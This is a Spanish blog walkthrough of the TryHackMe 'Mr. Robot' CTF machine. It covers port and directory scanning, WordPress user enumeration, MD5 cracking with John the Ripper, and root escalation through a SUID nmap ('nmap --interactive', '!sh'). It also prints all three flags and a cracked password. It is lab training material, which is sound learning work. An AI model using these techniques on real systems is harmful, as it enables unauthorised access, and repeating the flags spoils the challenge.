---
layout: post
title: Tryhackme - Mr. Robot
autor: S3cureroy
date: 2022-12-18
categories: [CTF, Tryhackme]
tags: [suid, wordpress, reverse shell, robots.txt, brute force, nmap]
---

Ya está aquí mi *Walkthrough* sobre la máquina Mr.Robot de Tryhackme, hasta ahora, la máquina con la clasificación de dificultad más alta que he completado (sí n00b) y probablemente, con la que más me he divertido.

En la máquina se siguen unos pasos similares a la del resto de máquinas que ya están resueltas en el blog, pero en este caso, se da una vuelta de tuerca más, habiendo varios saltos de usuarios para la escalada de privilegios, además de utilizar una vulnerabilidad de Wordpress para poder acceder inicialmente a la máquina, y todo esto, realizando una enumeración inicial más detallada que en anteriores máquinas.


## Enumeración.

Como en todas las máquinas virtuales de este tipo de plataformas, se debe realizar un primer escaneo de puertos para conocer la superficie de exposición.

Para ello, se utiliza ```nmap``` con los parámetros que muestran el versionado, y lanza los primeros *scripts nse*.

~~~bash
Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-19 23:59 GMT
Stats: 0:00:15 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 23:59 (0:00:10 remaining)
Nmap scan report for 10.10.250.84
Host is up (0.084s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn\'t have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
Device type: general purpose|specialized|storage-misc|WAP|broadband router|printer
Running (JUST GUESSING): Linux 3.X|4.X|2.6.X (91%), Crestron 2-Series (89%), HP embedded (89%), Asus embedded (88%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:2.6.22 cpe:/o:linux:linux_kernel:2.6 cpe:/h:asus:rt-n56u cpe:/o:linux:linux_kernel:3.4
Aggressive OS guesses: Linux 3.10 - 3.13 (91%), Linux 3.10 - 4.11 (90%), Linux 3.12 (90%), Linux 3.13 (90%), Linux 3.13 or 4.2 (90%), Linux 3.2 - 3.5 (90%), Linux 3.2 - 3.8 (90%), Linux 4.2 (90%), Linux 4.4 (90%), Crestron XPanel control system (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   40.98 ms 10.9.0.1
2   89.35 ms 10.10.250.84

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.48 seconds
~~~

Se puede ver que en la salida del comando que la máquina expone los puertos **22** perteneciente al servicio SSH, y los puertos **80** y **443** pertenecientes a un servidor Web.

### Servidor Web.

Se decide comenzar a enumerar la página web, y concretamente el puerto 80, donde se puede ver que la página tiene la estética de una shell, que además, se puede comprobar que es interactiva.

![](https://i.imgur.com/wUiTvmV.png)

Para comprobar si existen recursos interesantes en la web, se decide *fuzzear* mediante el programa ```dirsearch```.

~~~console
python3 dirsearch.py -u http://10.10.250.84 -e " "

 _|. _ _  _  _  _ _|_    v0.3.9     
(_||| _) (/_(_|| (_| )

Extensions:  | HTTP method: getHTTP method: get | Threads: 10 | Wordlist size: 6559 | Request count: 6559

Target: http://10.10.250.84
Output File: /home/s3cureroy/TOOLS/DIRSEARCH/reports/10.10.250.84/21-03-28_04-51-12

[04:51:12] Starting: 
[04:55:06] 403 -  222B  - /.htaccess-dev                              
[04:55:06] 403 -  224B  - /.htaccess-local
[04:55:06] 403 -  224B  - /.htaccess-marco
[04:55:06] 403 -  223B  - /.htaccess.bak1
[04:55:06] 403 -  222B  - /.htaccess.old
[04:55:06] 403 -  223B  - /.htaccess.orig
[04:55:06] 403 -  225B  - /.htaccess.sample
[04:55:06] 403 -  223B  - /.htaccess.save
[04:55:06] 403 -  222B  - /.htaccess.txt
[04:55:06] 403 -  221B  - /.htaccessBAK
[04:55:06] 403 -  221B  - /.htaccessOLD
[04:55:06] 403 -  222B  - /.htpasswd-old
[04:55:06] 403 -  222B  - /.htaccessOLD2
[04:55:06] 403 -  220B  - /.httr-oauth
[04:59:38] 200 -    1KB - /
[04:59:39] 301 -    0B  - /%2e%2e/google.com  ->  http://10.10.250.84/../google.com
[04:59:44] 301 -    0B  - /0  ->  http://10.10.250.84/0/            
[05:03:02] 301 -  234B  - /admin  ->  http://10.10.250.84/admin/       
[05:03:06] 301 -    0B  - /adm/index.php  ->  http://10.10.250.84/adm/
[05:03:21] 301 -    0B  - /admin_area/index.php  ->  http://10.10.250.84/admin_area/
[05:05:09] 200 -    1KB - /admin/                 
[05:05:13] 200 -    1KB - /admin/?/login
[05:05:14] 403 -  224B  - /admin/.htaccess       
[04:05:48] 200 -    1KB - /admin/index
[04:05:48] 200 -    1KB - /admin/index.html
[04:05:51] 301 -    0B  - /admin/index.php  ->  http://10.10.250.84/admin/
[04:06:23] 301 -    0B  - /admin2/index.php  ->  http://10.10.250.84/admin2/
[04:06:43] 301 -    0B  - /adminarea/index.php  ->  http://10.10.250.84/adminarea/
[04:07:57] 301 -    0B  - /administrator/index.php  ->  http://10.10.250.84/administrator/
[04:09:37] 301 -    0B  - /apc/index.php  ->  http://10.10.250.84/apc/
[04:10:37] 301 -  234B  - /audio  ->  http://10.10.250.84/audio/                
[04:10:40] 301 -    0B  - /atom  ->  http://10.10.250.84/feed/atom/
[04:11:48] 301 -    0B  - /bb-admin/index.php  ->  http://10.10.250.84/bb-admin/
[04:12:15] 301 -    0B  - /bitrix/admin/index.php  ->  http://10.10.250.84/bitrix/admin/
[04:12:25] 301 -  233B  - /blog  ->  http://10.10.250.84/blog/                  
[04:13:42] 301 -    0B  - /Citrix/AccessPlatform/auth/clientscripts/cookies.js  ->  http://10.10.250.84/Citrix/AccessPlatform/auth/clientscripts/cookies.js
[04:15:43] 301 -  232B  - /css  ->  http://10.10.250.84/css/                    
[04:18:00] 301 -    0B  - /engine/classes/swfupload/swfupload_f9.swf  ->  http://10.10.250.84/engine/classes/swfupload/swfupload_f9.swf
[04:18:01] 301 -    0B  - /engine/classes/swfupload/swfupload.swf  ->  http://10.10.250.84/engine/classes/swfupload/swfupload.swf
[04:18:27] 301 -    0B  - /etc/lib/pChart2/examples/imageMap/index.php  ->  http://10.10.250.84/etc/lib/pChart2/examples/imageMap/
[04:18:42] 301 -    0B  - /extjs/resources/charts.swf  ->  http://10.10.250.84/extjs/resources/charts.swf
[04:18:47] 200 -    0B  - /favicon.ico                                          
[04:19:01] 301 -    0B  - /feed  ->  http://10.10.250.84/feed/                  
[04:20:49] 301 -    0B  - /html/js/misc/swfupload/swfupload.swf  ->  http://10.10.250.84/html/js/misc/swfupload/swfupload.swf
[04:21:17] 301 -  235B  - /images  ->  http://10.10.250.84/images/              
[04:21:20] 301 -    0B  - /image  ->  http://10.10.250.84/image/
[04:21:50] 200 -    1KB - /index.html
[04:21:56] 301 -    0B  - /index.php  ->  http://10.10.250.84/
[04:21:56] 301 -    0B  - /index.php/login/  ->  http://10.10.250.84/login/
[04:22:27] 200 -  504KB - /intro                     
[04:22:51] 301 -  231B  - /js  ->  http://10.10.250.84/js/
[04:23:33] 200 -  309B  - /license.txt
[04:24:11] 302 -    0B  - /login  ->  http://10.10.250.84/wp-login.php
[04:24:23] 302 -    0B  - /login/  ->  http://10.10.250.84/wp-login.php
[04:26:14] 301 -    0B  - /modelsearch/index.php  ->  http://10.10.250.84/modelsearch/
[04:26:41] 301 -    0B  - /myadmin/index.php  ->  http://10.10.250.84/myadmin/
[04:28:13] 301 -    0B  - /panel-administracion/index.php  ->  http://10.10.250.84/panel-administracion/
[04:29:08] 403 -   94B  - /phpmyadmin
[04:29:56] 403 -   94B  - /phpmyadmin/                                  
[04:29:56] 403 -   94B  - /phpmyadmin/scripts/setup.php
[04:30:30] 301 -    0B  - /pma/index.php  ->  http://10.10.250.84/pma/
[04:31:28] 200 -   64B  - /readme                         
[04:31:28] 200 -   64B  - /readme.html
[04:31:58] 200 -   41B  - /robots.txt             
[04:32:04] 301 -    0B  - /rss  ->  http://10.10.250.84/feed/
[04:33:51] 200 -    0B  - /sitemap
[04:33:51] 200 -    0B  - /sitemap.xml
[04:33:51] 200 -    0B  - /sitemap.xml.gz
[04:33:52] 301 -    0B  - /siteadmin/index.php  ->  http://10.10.250.84/siteadmin/
[04:34:30] 301 -    0B  - /sql/index.php  ->  http://10.10.250.84/sql/
[04:36:26] 301 -    0B  - /templates/beez/index.php  ->  http://10.10.250.84/templates/beez/
[04:36:27] 301 -    0B  - /templates/rhuk_milkyway/index.php  ->  http://10.10.250.84/templates/rhuk_milkyway/
[04:36:27] 301 -    0B  - /templates/ja-helio-farsi/index.php  ->  http://10.10.250.84/templates/ja-helio-farsi/
[04:37:05] 301 -    0B  - /tmp/index.php  ->  http://10.10.250.84/tmp/      
[04:40:08] 301 -    0B  - /webadmin/index.php  ->  http://10.10.250.84/webadmin/

Task Completed        
~~~

Se revisan aquellos recursos que hayan arrojado un código de error 200, como son los ficheros ```/readme``` y ``` /robots.txt```

Revisando este último, se menciona la existencia de 2 ficheros, uno, es el fichero llamado **key-1-of-3.txt** que contiene la primera de las flags (**073403c8a58a1f80d943455fb30724b9**).

![](https://i.imgur.com/2lUSIka.png)

El otro fichero que menciona el fichero robots, es un fichero llamado **fsocity.dic** que aparentemente parece un diccionario que se guarda para usarlo en algún momento, si fuera necesario (SPOILER: Así es).


Volviendo al listado de recursos de la web, se comprueba la existencia de una redirección desde el recurso ```/login``` a ```/wp-login```, recurso usado por Wordpress para acceder a la parte administrativa del sitio.

Se hace uso de **WPScan**, una herramienta para enumerar ciertas características de un sitio que disponga del famoso CMS instalado, haciendo hincapié en plugins, temas vulnerables, además de usuarios (parámetros vp, vt y y u respectivamente).

~~~console
> $ wpscan --url http://10.10.250.84 -e vp,vt,u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.10
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.250.84/ [10.10.250.84]
[+] Started: Sun Mar 28 04:56:22 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache
 |  - X-Mod-Pagespeed: 1.9.32.3-4523
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://10.10.250.84/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.250.84/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] The external WP-Cron seems to be enabled: http://10.10.250.84/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defenheld-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.250.84/addf183.html, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.3.1'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.250.84/addf183.html, Match: 'WordPress 4.3.1'

[+] WordPress theme in use: twentyfifteen
 | Location: http://10.10.250.84/wp-content/themes/twentyfifteen/
 | Last Updated: 2021-03-09T00:00:00.000Z
 | Readme: http://10.10.250.84/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 2.9
 | Style URL: http://10.10.250.84/wp-content/themes/twentyfifteen/style.css?ver=4.3.1
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen/
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.250.84/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: 'Version: 1.3'

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:05:33 <===========================================================================================================================================================> (330 / 330) 100.00% Time: 00:05:33
[+] Checking Theme Versions (via Passive and Aggressive Methods)                        
                                                                                        
[i] No themes Found.                                                                    
                                                                                        
[+] Enumerating Users (via Passive and Aggressive Methods)                              
 Brute Forcing Author IDs - Time: 00:00:02 <=============================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:02
                                                                                        
[i] No Users Found.                                                                     
                                                                                        
[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.    
[!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register                                                                                                                                      
                                                                                        
[+] Finished: Sun Mar 28 05:04:03 2021                                                  
[+] Requests Done: 390                                                                  
[+] Cached Requests: 10                                                                 
[+] Data Sent: 90.518 KB
[+] Data Received: 384.332 KB
[+] Memory used: 207.73 MB
[+] Elapsed time: 00:07:40
~~~

Al no disponer de información reseñable, se intenta ver si el formulario dispone de la vulnerabilidad de enumeración de usuarios. Comprobando que sí.

Esto se hace, probando un usuario válido y otro inventado para verificar si la web arroja un mensaje de error distinto. 

- Mensaje de error al introducir la contraseña mal para un usuario inventado.  
![](https://i.imgur.com/ofs6rBG.png)

- Se prueba con el nombre del protagonista de Mr. Robot.  
![](https://i.imgur.com/6jUYZP8.png)

> En mi caso, fue completamente casual, puesto que soy fan de la serie, pero posteriormente descubrí leyendo un *Walkthrough* que en el fichero de licencia se encuentran las credenciales.
{: .prompt-warning }

## Post-explotación.

Al revisar dentro del directorio *home* del usuario, se localizan 2 ficheros, el primero, es el que parece la segunda flag de la máquina, pero que no se disponen de permisos necesarios para leer. Y el segundo, que parece ser, el *hash* de alguna contraseña.

~~~console
ls -lrt /home/robot
total 8
-r-------- 1 robot robot 33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot 39 Nov 13  2015 password.raw-md5
$ cat /home/robot/key-2-of-3.txt
cat: /home/robot/key-2-of-3.txt: Permission denied
$ cat /home/robot/password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
~~~

Con el comando ```hash-identifier``` se confirma que el algoritmo es **MD5**.

> Aunque en el nombre del fichero lo informe, nunca está de más, y es una buena práctica confirmar la información.
{: .prompt-tip}

~~~console
hash-identifier                                                                    
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: c3fcd3d76192e4007dfb496cca67e13b

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

~~~

Mediante el programa **John the ripper** se rompe la contraseña facilmente, obteniendo **abcdefghijklmnopqrstuvwxyz**.

~~~console
john --format=raw-md5 --wordlist=/home/s3cureroy/DICCIONARIOS/rockyou.txt hashrobot.hash

Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status

abcdefghijklmnopqrstuvwxyz (robot)

1g 0:00:00:00 DONE (2021-03-28 15:12) 12.50g/s 506400p/s 506400c/s 506400C/s boogieman..1234123
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed
~~~


Usando el método de [Ironhackers](https://ironhackers.es/en/tutoriales/como-conseguir-tty-totalmente-interactiva/) para obtener una shell completa, ya que la obtenida en una primera instancia no permite usar el comando ```su``` para cambiar el usuario, se puede cambiar al usuario **robot**.

Se consigue, por tanto, la segunda flag (**822c73956184f694993bede3eb39f959**) del fichero que pertenecía al mencionado usuario **robot**.

~~~console
robot@linux:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
~~~

## Escalada de privilegios. 

Para obtener la última clave, se intuye que se debe escalar los privilegios al usuario root de la máquina.

Por tanto, se comienza a recoger información para obtener una posible vía para llegar a ser root.

Mediante el comando ```find``` se buscan los comandos que sean explotables mediante el bit SUID, detectando que **nmap** es uno de los presentes en la máquina.

> El comando usado es ```find / -perm -u=s -type f 2>/dev/null``` visto ya en algún post anterior del blog.
{: .prompt-tip}

~~~console
-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap
~~~

Buscando en el listado de **LOLBins** de la web [GTFObins](https://gtfobins.github.io/gtfobins/nmap/), se verifica, que nmap puede llamar a una shell interactiva.

Si se ejecuta con el bit SUID activado, y el binario pertenece al usuario root, es como si el propio root lo ejecutase.

~~~console
robot@linux:/tmp$ nmap --interactive
~~~

Una vez en la shell proporcionada por nmap, se puede insertar el comando ```!sh``` para llamar a la shell sh, pero con los permisos de root de la máquina.

~~~console
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
# id
id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
~~~

Para terminar, dentro del directorio ```/root``` se puede listar los ficheros que hay, y leer el contenido de la tercera y última flag del reto(**04787ddef27c3dee1ee161b21670b4e4**).

~~~console
# ls -lrt
total 4
-r-------- 1 root root 33 Nov 13  2015 key-3-of-3.txt
-rw-r--r-- 1 root root  0 Nov 13  2015 firstboot_done


# cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
~~~

Y hasta aquí, una de las máquinas más interesantes a las que me enfrenté hasta el momento, que junto a la temática que tiene, como es, la serie de Sam Esmail que tanto me gusta.


<a href="#top">Volver arriba</a>
